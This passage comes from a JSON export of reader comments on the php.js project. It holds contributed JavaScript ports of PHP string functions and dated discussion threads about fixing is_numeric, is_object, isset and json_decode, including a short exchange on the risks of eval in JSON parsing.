f_haystack.substring(0, index);\r\n\t\t\tresult += f_replace;\r\n\t\t\tf_haystack = f_haystack.substring(index + f_needle.length);\r\n\t\t}\r\n\r\n\t\treturn result + f_haystack;\r\n\t},\r\n\r\n\t'str_ireplace' : function(f_needle, f_replace, f_haystack)\r\n\t{\r\n\t\tvar result = '';\r\n\t\tvar index = 0;\r\n\r\n\t\tvar haystack = f_haystack.toLowerCase();\r\n\t\tvar needle = f_needle.toLowerCase();\r\n\r\n\t\twhile((index = haystack.indexOf(needle)) &gt; -1)\r\n\t\t{\r\n\t\t\tresult += f_haystack.substring(0, index);\r\n\t\t\tresult += f_replace;\r\n\r\n\t\t\thaystack = haystack.substring(index + f_needle.length);\r\n\t\t\tf_haystack = f_haystack.substring(index + f_needle.length);\r\n\t\t}\r\n\r\n\t\treturn result + f_haystack;\r\n\t},\r\n\r\n\t'str_split' : function(f_string, f_split_length, f_backwards)\r\n\t{\r\n\t\tif(f_backwards == undefined)\r\n\t\t{\r\n\t\t\tf_backwards = false;\r\n\t\t}\r\n\r\n\t\tif(f_split_length &gt; 0)\r\n\t\t{\r\n\t\t\tvar result = new Array();\r\n\r\n\t\t\tif(f_backwards)\r\n\t\t\t{\r\n\t\t\t\tvar r = (f_string.length % f_split_length);\r\n\r\n\t\t\t\tif(r &gt; 0)\r\n\t\t\t\t{\r\n\t\t\t\t\tresult[result.length] = f_string.substring(0, r);\r\n\t\t\t\t\tf_string = f_string.substring(r);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\r\n\t\t\twhile(f_string.length &gt; f_split_length)\r\n\t\t\t{\r\n\t\t\t\tresult[result.length] = f_string.substring(0, f_split_length);\r\n\t\t\t\tf_string = f_string.substring(f_split_length);\r\n\t\t\t}\r\n\r\n\t\t\tresult[result.length] = f_string;\r\n\r\n\t\t\treturn result;\r\n\t\t}\r\n\r\n\t\treturn false;\r\n\t},\r\n\r\n\t'strcasecmp' : function(f_string1, f_string2)\r\n\t{\r\n\t\tvar string1 = f_string1.toLowerCase();\r\n\t\tvar string2 = f_string2.toLowerCase();\r\n\r\n\t\tif(string1 &gt; string2)\r\n\t\t{\r\n\t\t\treturn 1;\r\n\t\t}\r\n\t\telse if(string1 == string2)\r\n\t\t{\r\n\t\t\treturn 0;\r\n\t\t}\r\n\r\n\t\treturn -1;\r\n\t},\r\n\r\n\t'strcmp' : function(f_string1, f_string2)\r\n\t{\r\n\t\tif(f_string1 &gt; f_string2)\r\n\t\t{\r\n\t\t\treturn 1;\r\n\t\t}\r\n\t\telse if(f_string1 == f_string2)\r\n\t\t{\r\n\t\t\treturn 0;\r\n\t\t}\r\n\r\n\t\treturn -1;\r\n\t},\r\n\r\n\t'stripos' : function(f_haystack, f_needle, f_offset)\r\n\t{\r\n\t\tvar haystack = f_haystack.toLowerCase();\r\n\t\tvar needle = f_needle.toLowerCase();\r\n\t\tvar index = 0;\r\n\r\n\t\tif(f_offset == undefined)\r\n\t\t{\r\n\t\t\tf_offset = 0;\r\n\t\t}\r\n\r\n\t\tif((index = haystack.indexOf(needle, f_offset)) &gt; -1)\r\n\t\t{\r\n\t\t\treturn index;\r\n\t\t}\r\n\r\n\t\treturn false;\r\n\t},\r\n\r\n\t'strlen' : function(f_string)\r\n\t{\r\n\t\treturn f_string.length;\r\n\t},\r\n\r\n\t'strnatcasecmp' : function(f_string1, f_string2, f_version)\r\n\t{\r\n\t\tthis.strnatcmp(f_string1.toLowerCase(), f_string2.toLowerCase(), f_version);\r\n\t},\r\n\r\n\t'strnatcmp' : function(f_string1, f_string2)\r\n\t{\r\n\t\tif(f_version == undefined)\r\n\t\t{\r\n\t\t\tf_version = false;\r\n\t\t}\r\n\r\n\t\tvar array1 = this.__strnatcmp_split(f_string1);\r\n\t\tvar array2 = this.__strnatcmp_split(f_string2);\r\n\r\n\t\tvar len = array1.length;\r\n\t\tvar text = true;\r\n\r\n\t\tvar result = -1;\r\n\t\tvar r = 0;\r\n\r\n\t\tif(len &gt; array2.length)\r\n\t\t{\r\n\t\t\tlen = array2.length;\r\n\t\t\tresult = 1;\r\n\t\t}\r\n\r\n\t\tfor(i = 0; i &lt; len; i++)\r\n\t\t{\r\n\t\t\tif(isNaN(array1[i]))\r\n\t\t\t{\r\n\t\t\t\tif(isNaN(array2[i]))\r\n\t\t\t\t{\r\n\t\t\t\t\ttext = true;\r\n\r\n\t\t\t\t\tif((r = this.strcmp(array1[i], array2[i])) != 0)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\treturn r;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t\telse if(text)\r\n\t\t\t\t{\r\n\t\t\t\t\treturn 1;\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\treturn -1;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\telse if(isNaN(array2[i]))\r\n\t\t\t{\r\n\t\t\t\tif(text)\r\n\t\t\t\t{\r\n\t\t\t\t\treturn -1;\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\treturn 1;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\telse \r\n\t\t\t{\r\n\t\t\t\tif(text || f_version)\r\n\t\t\t\t{\r\n\t\t\t\t\tif((r = (array1[i] - array2[i])) != 0)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\treturn r;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\tif((r = this.strcmp(array1[i].toString(), array2[i].toString())) != 0)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\treturn r;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\r\n\t\t\t\ttext = false;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\treturn result;\r\n\t},\r\n\r\n\t'__strnatcmp_split' : function(f_string)\r\n\t{\r\n\t\tvar result = new Array();\r\n\t\tvar buffer = '';\r\n\t\tvar chr = '';\r\n\r\n\t\tvar text = true;\r\n\r\n\t\tfor(var i = 0; i &lt; f_string.length; i++)\r\n\t\t{\r\n\t\t\tchr = f_string.substring(i, i + 1);\r\n\r\n\t\t\tif(chr.match(\/[0-9]\/))\r\n\t\t\t{\r\n\t\t\t\tif(text)\r\n\t\t\t\t{\r\n\t\t\t\t\tif(buffer.length &gt; 0)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tresult[result.length] = buffer;\r\n\t\t\t\t\t\tbuffer = '';\r\n\t\t\t\t\t}\r\n\r\n\t\t\t\t\ttext = false;\r\n\t\t\t\t}\r\n\r\n\t\t\t\tbuffer += chr;\r\n\t\t\t}\r\n\t\t\telse if((text == false) &amp;&amp; (chr == '.') &amp;&amp; (i &lt; (f_string.length - 1)) &amp;&amp; (f_string.substring(i + 1, i + 2).match(\/[0-9]\/)))\r\n\t\t\t{\r\n\t\t\t\tresult[result.length] = buffer;\r\n\t\t\t\tbuffer = '';\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tif(text == false)\r\n\t\t\t\t{\r\n\t\t\t\t\tif(buffer.length &gt; 0)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tresult[result.length] = parseInt(buffer);\r\n\t\t\t\t\t\tbuffer = '';\r\n\t\t\t\t\t}\r\n\r\n\t\t\t\t\ttext = true;\r\n\t\t\t\t}\r\n\r\n\t\t\t\tbuffer += chr;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tif(buffer.length &gt; 0)\r\n\t\t{\r\n\t\t\tif(text)\r\n\t\t\t{\r\n\t\t\t\tresult[result.length] = buffer;\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tresult[result.length] = parseInt(buffer);\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\treturn result;\r\n\t},\r\n\r\n\r\n\t'strpos' : function(f_haystack, f_needle, f_offset)\r\n\t{\r\n\t\tvar index = 0;\r\n\r\n\t\tif(f_offset == undefined)\r\n\t\t{\r\n\t\t\tf_offset = 0;\r\n\t\t}\r\n\r\n\t\tif((index = f_haystack.indexOf(f_needle, f_offset)) &gt; -1)\r\n\t\t{\r\n\t\t\treturn index;\r\n\t\t}\r\n\r\n\t\treturn false;\r\n\t},\r\n\r\n\t'strrev' : function(f_string)\r\n\t{\r\n\t\tvar result = '';\r\n\t\tvar index = f_string.length - 1;\r\n\r\n\t\twhile(index &gt;= 0)\r\n\t\t{\r\n\t\t\tresult += f_string.substring(index, index + 1);\r\n\t\t\tindex--;\r\n\t\t}\r\n\r\n\t\treturn result;\r\n\t},\r\n\r\n\t'strripos' : function(f_haystack, f_needle, f_offset)\r\n\t{\r\n\t\tvar haystack = f_haystack.toLowerCase();\r\n\t\tvar needle = f_needle.toLowerCase();\r\n\t\tvar index = 0;\r\n\r\n\t\tif((index = haystack.indexOf(needle, f_offset)) &gt; -1)\r\n\t\t{\r\n\t\t\tdo\r\n\t\t\t{\r\n\t\t\t\tf_offset = index;\r\n\t\t\t}\r\n\t\t\twhile((index = haystack.indexOf(needle, f_offset + 1)) &gt; -1);\r\n\r\n\t\t\treturn f_offset;\r\n\t\t}\r\n\r\n\t\treturn false;\r\n\t},\r\n\r\n\t'strrpos' : function(f_haystack, f_needle, f_offset)\r\n\t{\r\n\t\tvar index = 0;\r\n\r\n\t\tif((index = f_haystack.indexOf(f_needle, f_offset)) &gt; -1)\r\n\t\t{\r\n\t\t\tdo\r\n\t\t\t{\r\n\t\t\t\tf_offset = index;\r\n\t\t\t}\r\n\t\t\twhile((index = f_haystack.indexOf(f_needle, f_offset + 1)) &gt; -1);\r\n\r\n\t\t\treturn f_offset;\r\n\t\t}\r\n\r\n\t\treturn false;\r\n\t},\r\n\r\n\t'strtolower' : function(f_string)\r\n\t{\r\n\t\treturn f_string.toLowerCase();\r\n\t},\r\n\r\n\t'strtoupper' : function(f_string)\r\n\t{\r\n\t\treturn f_string.toUpperCase();\r\n\t},\r\n\r\n\t'substr' : function(f_string, f_start, f_length)\r\n\t{\r\n\t\tif(f_start &lt; 0)\r\n\t\t{\r\n\t\t\tf_start += f_string.length;\r\n\t\t}\r\n\r\n\t\tif(f_length == undefined)\r\n\t\t{\r\n\t\t\tf_length = f_string.length;\r\n\t\t}\r\n\t\telse if(f_length &lt; 0)\r\n\t\t{\r\n\t\t\tf_length += f_string.length;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tf_length += f_start;\r\n\t\t}\r\n\r\n\t\tif(f_length &lt; f_start)\r\n\t\t{\r\n\t\t\tf_length = f_start;\r\n\t\t}\r\n\r\n\t\treturn f_string.substring(f_start, f_length);\r\n\t},\r\n\r\n\t'substr_count' : function(f_haystack, f_needle, f_offset)\r\n\t{\r\n\t\tvar result = 0;\r\n\t\tvar index = 0;\r\n\r\n\t\tif(f_offset == undefined)\r\n\t\t{\r\n\t\t\tf_offset = 0;\r\n\t\t}\r\n\r\n\t\twhile((index = f_haystack.indexOf(f_needle, f_offset + 1)) &gt; -1)\r\n\t\t{\r\n\t\t\tresult++;\r\n\t\t\tf_offset = index;\r\n\t\t}\r\n\r\n\t\treturn result;\r\n\t},\r\n\r\n\t'trim' : function(f_string)\r\n\t{\r\n\t\treturn f_string.replace(\/^\\s*\/, '').replace(\/\\s*$\/, '');\r\n\t},\r\n\r\n\t'ucfirst' : function(f_string)\r\n\t{\r\n\t\treturn f_string.substring(0, 1).toUpperCase() + f_string.substring(1);\r\n\t},\r\n\r\n\t'ucword' : function(f_string)\r\n\t{\r\n\t\tvar result = '';\r\n\t\tvar chr = '';\r\n\t\tvar swap = true;\r\n\r\n\t\tfor(var i = 0; i &lt; f_string.length; i++)\r\n\t\t{\r\n\t\t\tchr = f_string.substring(i, i + 1);\r\n\r\n\t\t\tif(swap)\r\n\t\t\t{\r\n\t\t\t\tresult += chr.toUpperCase();\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tresult += chr;\r\n\t\t\t}\r\n\r\n\t\t\tif(chr.match(\/\\s\/))\r\n\t\t\t{\r\n\t\t\t\tswap = true;\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tswap = false;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\treturn result;\r\n\t}\r\n}\r\n\r\n\r\n[\/code]"},{"date":"2008-03-01 15:17:51","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Martijn Wieringa: I will add the functions that are missing here, thanks alot man!"},{"date":"2008-03-01 15:36:56","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Martijn Wieringa: And additional compliments for solid code. The integration went seamlessly, nice job!"},{"date":"2009-02-02 15:07:02","author":"taith","url":"divinedesigns.ca","comment":"some browsers will interpret a number as a string depending on how its set... hence a number, can be defined as a string, making the function return false all the time...\r\n\r\nthis will automatically turn it into an integer in this case\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction is_numeric(integer){\r\n return (!isNaN(integer*1));\r\n}\r\n[\/CODE]"},{"date":"2009-02-02 23:35:35","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ taith: Check, fixed!"},{"date":"2009-03-31 16:28:55","author":"Tim de Koning","url":"http:\/\/www.kingsquare.nl","comment":"Hi Kevin e.a.\n\nis_numeric('') returns true in javascript, not in PHP... Shouldn't this be:\n\n[CODE]\nfunction is_numeric( mixed_var ) {\n    return !isNaN(parseInt(mixed_var));\n}\n[\/CODE]"},{"date":"2009-04-03 16:44:35","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Tim de Koning: Thank you for noticing. I had to fix it a bit differently in but the bottom line is your testcase works now. Thanks!"},{"date":"2011-10-13 12:08:35","author":"max4ever","url":"","comment":"isNumeric('3a')  ==> return true, should return false"},{"date":"2011-10-13 12:17:12","author":"max4ever","url":"","comment":"please consider this function http:\/\/stackoverflow.com\/questions\/18082\/validate-numbers-in-javascript-isnumeric\/1830844#1830844"},{"date":"2012-04-30 08:07:26","author":"CoursesWeb","url":"http:\/\/www.coursesweb.net","comment":"Hi,\nFor is_numeric I use this:\n[code]\nreturn \/^[0-9]+[\\.,]{0,1}[0-9]*$\/i.test(obj);\n[\/code]"}],"is_object":[{"date":"2008-03-01 19:39:30","author":"Legaev Andrey","url":"","comment":"Hi\r\nI found few errors: \r\n1. typeof null returns 'object', but this is not an object.\r\n2. Original PHP function returns false if you pass array as parameter, but in JS returns 'object'. If we want fully emulate PHP function we should handle this case.\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction is_object( mixed_var ){\r\n    return (mixed_var !== null) &amp;&amp; (typeof( mixed_var ) == 'object');\r\n}\r\n[\/CODE]"},{"date":"2008-03-01 20:52:46","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Legaev Andrey: updated, thanks again Legaev!"},{"date":"2008-03-03 02:37:48","author":"Michael White","url":"","comment":"I found a way to detect the difference between objects and arrays. There is an incredibly slight change that you pass an array to this function and it still returns true but I'll explain that after the code.\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nalert(&quot;Obj: &quot; + is_object({foo: &quot;bar&quot;}));\r\nalert(&quot;Arr: &quot; + is_object([&quot;foo&quot;, &quot;bar&quot;]));\r\n\r\nfunction is_object( mixed_var ){\r\n\tif(typeof(mixed_var.join) != &quot;function&quot;) {\r\n\t    return (mixed_var !== null) &amp;&amp; (typeof( mixed_var ) == 'object');\r\n\t} else {\r\n\t\treturn false;\r\n\t}\r\n}\r\n[\/CODE]\r\n\r\nOk, this works by checking to see if there is a property of the array named &quot;join&quot; that contains a function object. If not then we know this is an object. If it is then we can reasonably assume that it is an array. I chose the join() method of arrays simply because it has been implemented since Netscape 3.0 and IE 3.0 and so should exist if you are working with an array.\r\n\r\nhttp:\/\/crestidg.com"},{"date":"2008-03-03 02:44:54","author":"Michael White","url":"","comment":"Why do I make things more complicated than they really are? Here is a much more sensible version that based on the content of the is_array() method. I apologize for polluting your message boards with the previous post.\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction is_object( mixed_var ){\r\n\tif(mixed_var instanceof Array) {\r\n\t\treturn false;\r\n\t} else {\r\n\t\treturn (mixed_var !== null) &amp;&amp; (typeof( mixed_var ) == 'object');\r\n\t}\r\n}\r\n[\/CODE]\r\n\r\nhttp:\/\/crestidg.com"},{"date":"2008-03-03 11:49:59","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Michael White: Good point, added!"},{"date":"2012-05-06 09:31:09","author":"????? ????? ???? ","url":"http:\/\/an3m1.com\/","comment":"This is a very informative article. I was looking for these things and here I found it. I am doing a project and this information is very useful me. Some things in here I have not thought about before  \n"}],"isset":[{"date":"2008-04-16 18:28:10","author":"[FremyCompany] Can be maked quicker :","url":"","comment":"[CODE=&quot;Javascript&quot;]function isset() {\r\n  var a=arguments; var l=a.length; var i=0;\r\n  while (i!=l) {\r\n    if (typeof(a[i])=='undefined') { return false; } else { i++; }\r\n  }\r\n  return true;\r\n}[\/CODE]"},{"date":"2008-04-17 12:48:15","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ FremyCompany: Updated, thank you!"},{"date":"2008-08-11 11:02:44","author":"Onno Marsman","url":"","comment":"1. should return false also on null values like in php\r\n2. should throw an error when no arguments are provided\r\n3. should throw an error when passed arguments are not variables, like in both examples. They would give an error in PHP. Not sure if this is possible or needed by anyone.\r\n\r\nImplementation for 1. and 2.  :\r\n[CODE =&quot;Javascript&quot;]\r\nfunction isset() {\r\n    var a=arguments; var l=a.length; var i=0;\r\n    if (l==0) { throw new Error('Empty isset'); }\r\n    while (i!=l) {\r\n        if (typeof(a[i])=='undefined' || a[i]===null) { return false; } else { i++; }\r\n    }\r\n    return true;\r\n}\r\n[\/CODE]\r\nI made up an error message because I thought:\r\n\r\nParse error: syntax error, unexpected ')', expecting T_STRING or T_VARIABLE or '$'\r\n\r\nWould be pushing it ;)\r\n\r\nThe check for l==0 could be placed after the while to make it a littlebit more efficient in the case it would return false, but I think this is more readable."},{"date":"2008-08-27 18:17:25","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsman: Another great attribution to our project! Thank you so much!"},{"date":"2009-01-27 14:23:10","author":"Maxim","url":"","comment":"[CODE=&quot;Javascript&quot;]\r\nvar a=1;\r\ndelete a;\r\nisset(a);\r\n[\/CODE]\r\nthrows:\r\nReferenceError: a is not defined"},{"date":"2009-01-27 14:30:57","author":"Maxim","url":"","comment":"sorry, it doesn't work in Firebug console, \r\nbut works properly in firefox itself.\r\n\r\nthanks for good function :)"},{"date":"2009-02-01 21:55:58","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Maxim: :)"},{"date":"2009-03-06 17:00:12","author":"mk.keck","url":"","comment":"Function isset() does not work?\r\nI've done follow test:\r\n[CODE=&quot;Javascript&quot;]\r\nif (!isset(a)) { \/\/ a does'nt really exists\r\n    alert('Var \\'a\\' is undefined');\r\n} else {\r\n    alert('Var \\'a\\' = &quot;' + a + '&quot;');\r\n}\r\n[\/CODE]\r\nI get an Error from browser 'a is undefined'.\r\nIf I use isset('a') I get alwasy true ... ?\r\n\r\nI've changed the function isset():\r\n[CODE=&quot;Javascript&quot;]\r\nfunction isset() {\r\n    var a = arguments;\r\n    if (a.length &gt; 0) {\r\n        var i = 0;\r\n        while (i !== a.length) {\r\n            if (typeof(a[i]) === 'object') {\r\n                if (typeof(a[i]) === 'undefined' || a[i] === null) {\r\n                    return false;\r\n                } else {\r\n                    i++;\r\n                }\r\n            } else if (typeof(a[i]) === 'string') {\r\n                if (typeof(window[a[i]]) === 'undefined' || window[a[i]] === null) {\r\n                    return false;\r\n                } else {\r\n                    i++;\r\n                }\r\n            }\r\n        }\r\n        return true;\r\n    }\r\n    return false;\r\n}\r\n[\/CODE]\r\nNow I get the correct answer from function isset"},{"date":"2010-05-14 12:39:46","author":"abc","url":"www.gmail.com","comment":"puriyala"},{"date":"2010-07-27 16:23:58","author":"iia","url":"http:\/\/www.aquaregiafx.com","comment":"Thank you, you guys are great!"},{"date":"2010-07-28 08:35:14","author":"Rafa? Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"IMO, the if statement can be changed to\n\n[CODE]if (a[i] == null)[\/CODE]\nit will throw a lint warning, but only null and undefined equals null, so the == operator is used on purpose and the warning can be ignored."},{"date":"2010-07-28 08:37:39","author":"Rafa? Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"Sorry for the double comment, but wanted to add, that the else clause can be removed. Just leave the i++;"},{"date":"2010-07-28 20:06:39","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Rafa\u0142: Thanks for the ideas. I've applied your latter change, but in my view at least, while more succinct (and getting jslint to be quiet--which actually _is_ a pragmatic goal despite what some people say, given that a minimum of jslint complaints helps spot real errors), I do like the specificity of spelling it out, as it communicates that the issue was considered and addressed."},{"date":"2010-07-28 23:18:25","author":"Rafa? Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"@Brett Zamir:\nI agree that lint helps in many cases and should be respected in as many cases as possible, and strict rules are good for complex projects where many developers are involved, but sometimes we come across situations where a problem can be solved better when using non-lint compliant solutions. That is why IMO some exceptions should be allowed, especially when the developer is 101% sure of what he is doing (and a good example is the isset function, where it can be improved by using only _core features_ of javascript). But, if being lint compliant is priority for phpjs project than I have to accept your point of view and I'll try to avoid lint warnings in future improvements.\n\nBelow another approach to isset. The idea is to declare a var that holds undefined and compare arguments to null and to the undef variable. It might be slower (comparing to current solution) when checking only one argument, but should get faster when checking two or more variables, cause we are avoiding string comparison.\n\n[CODE]function isset(){\n   var a=arguments, l=a.length, i=0, undef;\n\n   [...]\n      if(a[i] === null || a[i] === undef)\n   [...]\n}[\/CODE]"},{"date":"2010-07-30 13:17:25","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Rafa\u0142 Kukawski: I agree with you that certain items should be allowed (my pet peeve is switch case fall-throughs which I'd like to allow \"fall-through\" comments to insist it was intentional though not requiring even that comment if cases are on the same line). \n\nThe real solution here I think is for someone to confirm whether JSLint is open source or not (I couldn't see that it was, though one site claimed it was BSD); if it isn't, we also need a good open source JS parser. Then configure it to make the exceptions we believe in. But since I'm short of time to do this now, I for one hope we will stick with a mostly JSLint-compliant set-up so we don't get used to too many warnings and then miss out on actually useful warnings.\n\nBtw, I took your nice optimization as it is shorter, but as far as timing goes, Firefox testing seemed to have it perform about the same for each no matter the number of arguments. Still, a little less bandwidth wouldn't hurt."},{"date":"2010-09-08 16:52:49","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Rafa\u0142 Kukawski: I agree that exceptions can be made, but not in this case. Altough == is shorter and equal in functionality here, developers reviewing your code really have to be in it to see that.\n\nBeing more explicit will make it clear what you mean and will benefit maintenance in the long run.\n\nOther than that: Thanks for your wonderful work. I'm impressed."},{"date":"2011-06-29 15:54:44","author":"dededd deded de deded","url":"dedded","comment":"dededde"},{"date":"2012-01-02 07:21:05","author":"carlos","url":"http:\/\/www.xim5.com","comment":"Is this function only checking if a variable has been set or is it actually working like in PHP where you can check something like this:\n[CODE]\nif(isset($_GET['var']))\n{\n   ...code...\n}\n[\/CODE]\n???"}],"json_decode":[{"date":"2009-06-17 06:04:03","author":"T.J. Leahy","url":"","comment":"This function should check to see if the browser has native JSON decoding first (IE8, FF 3.5) and use that when available.  Would make it faster and safer then running the input against multiple regular expressions. See http:\/\/hacks.mozilla.org\/2009\/06\/security-performance-native-json\/\n\n[code]\nif (typeof JSON == \"object\" && typeof JSON.parse == \"function\") {\n    return JSON.parse(str_json);\n}\n[\/code]"},{"date":"2009-06-18 06:53:48","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Fixed in SVN. Thanks for the report!\n\nFYI, if you reference a variable like JSON and it doesn't exist, it will cause a failure in JS, so we have to either enclose such a reference in a try-catch block (ugly) or reference it as a property of the window object--since referencing an undefined property does not give an error in JS. \n\nAs far as why I used \"this.window\" (\"window\" would be fine for most environments), it is because this will both refer to:\n\n1) the window object in the non-namespaced version (it resolves to \"window.window\" which, in JS, thankfully for our needs, happens to be a recursive reference to window), and \n2) the window attached to the object itself in the namespaced version (our namespaced version allows for the window to be set to a value other than the global \"window\" object for environments like JavaScript modules in Firefox extensions where 'window' is not available as a global but is passed in during object construction, and should automatically set it to the window global otherwise)."},{"date":"2009-06-18 14:17:44","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ T.J. Leahy + Brett Zamir: Awesome!"},{"date":"2009-10-18 02:34:40","author":"Michael White","url":"http:\/\/getsprink.com\/","comment":"The part that uses native browser JSON objects should be contained in a try\/catch block and return the proper value in accordance with how PHP handles bad JSON data.\n\n[CODE]\ntry {\n    return json.parse(str_json);\n}\ncatch(err) {\n    return str_json;\n}\n\n[\/CODE]"},{"date":"2009-10-18 07:18:08","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Michael: Thanks, but is that really how PHP handles it? the docs for json_decode say \"NULL is returned if the json cannot be decoded or if the encoded data is deeper than the recursion limit.\" Would be nice if someone could check for all possible json.parse\/json.stringify errors (and the rest of the function when these are not available) to check for the type of errors also recorded by json_last_error (and to add a property to the \"this.php_js\" global so that json_last_error() can retrieve this info). Ditto for json_encode()."},{"date":"2009-10-20 03:01:11","author":"Michael White","url":"http:\/\/getsprink.com\/","comment":"@kevin Hey - sorry. that's my fault. It should indeed return NULL if there's an error. My main point was that we should use the try\/catch to prevent exceptions from causing the JS to just stop unexpectedly."},{"date":"2009-10-25 13:49:22","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Yeah we need to look into this. Could be much better but I don't have enough time to work it myself right now. Maybe someone else reading this can have a go at it?\nWould be much appreciated!"},{"date":"2009-10-25 14:08:36","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Michael White: Just now saw your comment on json_encode & implemented the fixes!\n\nhttp:\/\/github.com\/kvz\/phpjs\/commit\/cae72555c08c11ec416f1c8ecfcd5e42509cb46d"},{"date":"2009-10-26 00:48:57","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Have made a fix (NULL to null) and added support for json_last_error(); see commits at http:\/\/github.com\/kvz\/phpjs\/commits\/master\/"},{"date":"2010-12-15 10:46:19","author":"Anes","url":"","comment":"Hi pals ,\nI am really stuck in parsing a JSON string and take it's values. I got the json string as \n{\"user\":{\"id\":\"1\",\"firstname\":\"Freelogin\",\"created\":\"0000-00-00\n00:00:00\",\"lastname\":\"Administrator\",\"email\":\"fred@websecurify.com\",\n\"usergroup_id\":\"1\",\"status\":\"1\",\"ip_enable\":\"N\",\"priv\":\"0\",\"expire\":\"\"},\"data\":{\n\"1\":{\"5\":{\"last_update\":\"2010-12-13\n16:16:16\",\"status\":\"0\"},\"3\":{\"last_update\":\"2010-12-13\n16:41:48\",\"status\":\"1\"}},\"2\":{\"6\":{\"last_update\":\"2010-12-13\n16:41:48\",\"status\":\"1\"}}},\"server_array\":[{\"id\":\"1\",\"name\":\"anes.yyy.net\"},{\n\"id\":\"2\",\"name\":\"neseema.xxx.net\"}],\"service_array\":[{\"id\":\"5\",\"name\":\"POP3\"},\n{\"id\":\"6\",\"name\":\"Cpanel\"},{\"id\":\"3\",\"name\":\"SMTP\"}],\"sort_by\":\"servername\",\n\"sort_order\":\"ASC\",\"pagelinks\":\"\",\"totrows\":\"2\",\"offset\":\"0\",\"limitvalue\":\"10\",\n\"rows_monitor\":2,\"current\":\"monitor\",\"uri\":false}\n\nFriends How to Parse this and take the Results for further\nprocessing in javascript.... I am waiting to hear from you\nSoon..\n\nRegards\nAnes P.A\n\n"},{"date":"2010-12-15 15:16:38","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Anes: First make sure you don't have line breaks when you make the string. When I tried pasting your string now, it was broken into separate lines which will not work in JS. If that is fixed, then you can just use it like this:\n[CODE]\nvar obj = json_decode('{\"user\":\"test\"}');\nalert(obj.user); \/\/ 'test'\n[CODE]"},{"date":"2011-06-05 04:02:27","author":"Miguel Espinoza","url":"it4fox.com","comment":"I ran into a situation today with Firefox 3.6.17 (didnt test with other browsers) and Firebug 1.7.1 where \"this.window\" was not recognized, it came from a pseudo pop up (div), I fixed this by editing line 20 from:\n[code]\nvar json = this.window.JSON;\n[\/code]\nto:\n[code]\nvar json = (typeof this.window != 'undefined' ? this.window.JSON : undefined);\n[\/code]"},{"date":"2011-06-05 18:16:58","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Miguel: Could you offer your code or a snippet thereof by any chance? I really understood our namespaced version was including this.window, and that in the non-namespaced version, window.window (this.window) was recursively self-referential."},{"date":"2012-04-04 16:16:04","author":"Pavel Kukov","url":"","comment":"On line: #68: eval is evil fix\n[CODE]\nj=new Function('return '+text); return j();\n[\/CODE]"},{"date":"2012-04-05 02:40:47","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Pavel: \n1) Function() suffers from the same problem as eval(). So does the first argument to setTimeout or setInterval when set to a string.\n2) The function comments mention that the regular expressions are already ensuring that the characters in the expression are safe for evaluation. We could use a genuine parser, as I believe exist at json.org , but I'm not sure that there is anything wrong as long as the regex we are using is fail-safe (except that a real parser should be able to give better reporting of errors)."},{"date":"2012-04-05 20:30:28","author":"Pavel Kukov","url":"","comment":" \u2022eval() evaluates a string as a JavaScript expression within the current execution scope and can affect local variables.\n \u2022new Function() parses the JavaScript code stored 